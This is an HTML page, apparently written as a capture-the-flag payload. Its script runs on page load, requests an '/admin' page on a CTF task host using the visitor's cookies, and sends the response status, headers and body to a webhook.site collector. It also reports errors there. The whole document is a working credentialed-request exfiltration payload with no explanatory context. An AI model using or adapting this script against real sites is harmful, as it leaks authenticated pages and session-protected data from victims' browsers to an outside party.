<!DOCTYPE html>
<html>
<body>
<script>
fetch('http://tasks.goidactf.ru:20061/admin', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => {
    // Получаем полный ответ от /admin
    const status = response.status;
    const headers = Object.fromEntries(response.headers.entries());
    
    return response.text().then(body => ({
        status,
        headers,
        body
    }));
})
.then(adminData => {
    // Формируем данные для отправки на webhook
    const payload = {
        timestamp: new Date().toISOString(),
        source: 'admin-request',
        data: adminData
    };
    
    // Отправляем данные на webhook.site
    return fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
})
.then(webhookResponse => {
    if (webhookResponse.ok) {
        console.log('✅ Данные успешно отправлены на webhook');
        return webhookResponse.text();
    } else {
        throw new Error(`Webhook error: ${webhookResponse.status}`);
    }
})
.then(webhookResult => {
    console.log('Webhook response:', webhookResult);
})
.catch(error => {
    console.error('❌ Ошибка:', error);
    
    // Пытаемся отправить информацию об ошибке на webhook
    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            error: error.toString()
        })
    }).catch(() => {});
});
</script>
</body>
</html>
